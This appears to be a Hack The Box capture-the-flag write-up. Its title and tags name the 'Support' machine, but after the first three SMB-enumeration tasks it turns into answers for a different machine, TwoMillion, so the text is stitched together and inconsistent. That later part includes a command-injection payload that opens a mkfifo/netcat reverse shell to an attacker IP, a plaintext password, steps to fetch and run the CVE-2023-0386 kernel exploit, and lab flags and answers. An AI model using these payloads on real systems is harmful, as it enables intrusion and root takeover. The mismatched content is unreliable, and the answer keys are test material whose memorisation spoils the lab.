---
title: "HTB: Support"
description: "Hack The Box - Support Writeup"
tags: [htb, connected, freepbx, asterisk, cve-2025-57819, linux, medium]
---

### Task 1: SMB Shares
**Question:** How many shares is Support showing on SMB?

```bash 
└─$ sudo nmap -sC -sV 10.129.23.228 -T4
[sudo] password for ziliang:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-11 22:23 +08
Nmap scan report for 10.129.23.228 (10.129.23.228)
Host is up (0.022s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings:
|   DNS-SD-TCP:
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-11 14:22:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Nam
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=8/11%Time=6A7B3063%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -29s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-08-11T14:23:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.71 seconds

# Find out the number of SMB shares
smbclient -L //10.129.23.228 -U guest 
Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.23.228 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Ans: `6` 

### Task 2 Default Share of Windows Domain Controller
**Question:** Which share is not a default share for a Windows domain controller?

From the output above, we can observe that shares with a `$` at the end are the default shares of a Windows Domain Controller. Additionally, the NETLOGON and SYSVOL are Logon server share, hence, those 2 are also the default shares of a Windows Domain Controller. The only share that is non-default would be `support-tools`. 

Ans: `support-tools`

### Task 3 Getting Items from a SMB share  
**Question:** Almost all of the files in this share are publicly available tools, but one is not. What is the name of that file?

We need to first connect to the `support-tools` share as a guest. To do this, we can run the following command. 

```bash
smbclient -N //10.129.23.228/support-tools
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 21 01:01:06 2022
  ..                                  D        0  Sat May 28 19:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022
  putty.exe                           A  1273576  Sat May 28 19:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022 
```
From the output, `7-ZipPortable_21.07.paf.exe` is a publicly available open-source tool to compress files, `npp.8.4.1.portable.x64.zip` is the 64-bit portable archive for Notepad++ version 8.4.1, released on May 11, 2022, `putty.exe` is the main executable file for PuTTY, a free and open-source terminal emulator and network file transfer application used primarily on Windows, `SysinternalsSuite.zip` is a compressed folder containing the official Microsoft Sysinternals troubleshooting tools, such as Process Explorer, Autoruns, and PsTools, `windirstat1_1_2_setup.exe` is the installer file for WinDirStat (Windows Directory Statistics) version 1.1.2, a classic free disk usage statistics viewer and cleanup tool for Windows that graphically displays folder and file sizes to help free up storage space, `WiresharkPortable64_3.6.5.paf.exe` is the 64-bit portable installer file for Wireshark version 3.6.5, packaged in the PortableApps format (.paf.exe). Thus, the only file that is not openly available would be `UserInfo.exe.zip`. 

Ans: `UserInfo.exe.zip`

### Task 4 Downloading files from SMB share
**Question:** The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?

Ans: `base64` 

### Task 5 
**Question:** What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?

To be able to answer this question, we have to first be able to log into the page and access the `Access` page of the website. Looking through the entire page, there is no button to allow us to sign up other than the `join` button, which, to proceed will require and invite code. 

We can make use of the following curl command to send a POST request to the `/api/v1/invite/how/to/generate` to see how we can generate an invite code. 

```bash 
┌──(ziliang㉿192)-[~]
└─$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}  
```

Using Cyberchef and ROT13, we can decrypt the message to be the following: `In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`. Following the guide's advice, we make use of the curl command again to send the second POST request to the endpoint. 

```bash 
┌──(ziliang㉿192)-[~]
└─$ curl -X POST http://2million.htb/api/v1/invite/generate       
{"0":200,"success":1,"data":{"code":"TzNCNUYtOVMyOFktTlY1UlctR0JZRkc=","format":"encoded"}}     
```

Since the invite code is encoded and from the `=` sign at the end of the encoded code, we can deduce that this is likely to be a base64 encoding, we can make use of the following command to decode. 

```bash 
┌──(ziliang㉿192)-[~]
└─$ echo TzNCNUYtOVMyOFktTlY1UlctR0JZRkc= | base64 -d
O3B5F-9S28Y-NV5RW-GBYFG         
```

From here onwards, we can sign up, then go to the `Access` page and download the connection pack, while leaving the browser inspector opened with the Network tab opened. There, we can see that when we click on the `Connection Pack` button, a GET request is sent to `http://2million.htb/api/v1/user/vpn/generate`, hence the relative path would be `/api/v1/user/vpn/generate`. 

Ans: `/api/v1/user/vpn/generate`

### Task 6 Route List 
**Question:** How many API endpoints are there under /api/v1/admin?

To answer this question, my first thought would be to use a tool like `gobuster` to brute force and find the directories. However, upon some googling, I realised that there are certain endpoints that are not a direct path but involve a longer and nested path. Thus, we have to find the route list and use a curl command to find out the number of endpoints from the route list. However, before we can run the `curl` command, we have to obtain the PHP Session ID cookie from the authenticated website. To do this, we can log in and go to the browser inspector tool and go to the Application tab and look for the PHPSESSID under the Cookie option. 

```bash 
curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=ri4tmc7ev0qutbl74tg27286se" | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
Ans: `3`

### Task 7 Endpoint 
**Question:** What API endpoint can change a user account to an admin account?

From the output in Task 6, the endpoint that can change a user account to an admin account is `/api/v1/admin/settings/update`. 

Ans: `/api/v1/admin/settings/update`

### Task 8 
**Question:** What API endpoint has a command injection vulnerability in it?

Ans: `/api/v1/admin/vpn/generate`

### Task 9 
**Question:** What file is commonly used in PHP applications to store environment variable values?

Ans: `.env`

### Submit User Flag 

We need to first be able to escalate our privilege and this can be done using command injection. 

In the attacker machine, first run a listener. 

```bash 
nc -lvnp 443 
```

Then, in a separate terminal, run the following command. 
```bash 
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ri4tmc7ev0qutbl74tg27286se"  --header "Content-Type: application/json" --data '{"username":"sarp && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.223 4443 >/tmp/f # "}'
```

```bash
admin@2million:~$ cat user.txt
b5dce7eb09a3d126d838dc81052288c2
```

### Task 11 /var/mail 
**Question:** What is the email address of the sender of the email sent to admin?

```bash
admin@2million:/var/mail$ ls
admin
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Ans: `ch4p@2million.htb`

### Task 12 CVE for vulnerability in the Linux kernel's OverlayFS subsystem
**Question:** What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?

Ans: `CVE-2023-0386`

### Submit Root Flag 

```bash 
ssh admin@10.129.229.66
# password: SuperDuperPass123

cd /tmp
mkdir exploit 
cd exploit 
wget -r -np -nH --cut-dirs=1 http://10.10.16.223/CVE-2023-0386/
cd CVE-2023-0386
make all 
./fuse ./ovlcap/lower ./gc
./exp
```

```bash
root@2million:/root# cat root.txt
6ebddeb84a14e2c139073516d36aae0a
```

Ans: `6ebddeb84a14e2c139073516d36aae0a`

### Task 14 
**Question:** [Alternative Priv Esc] What is the version of the GLIBC library on TwoMillion?

```bash 
root@2million:/root# ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```
Ans: `2.35`

### Task 15 
**Question:** [Alternative Priv Esc] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?

Ans: `CVE-2023-4911`

### Task 16 
**Question:** [Alternative Priv Esc] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.

Ans: `GLIBC_TUNABLES`

Refer to this [site](https://github.com/leesh3288/CVE-2023-4911) for more information. 
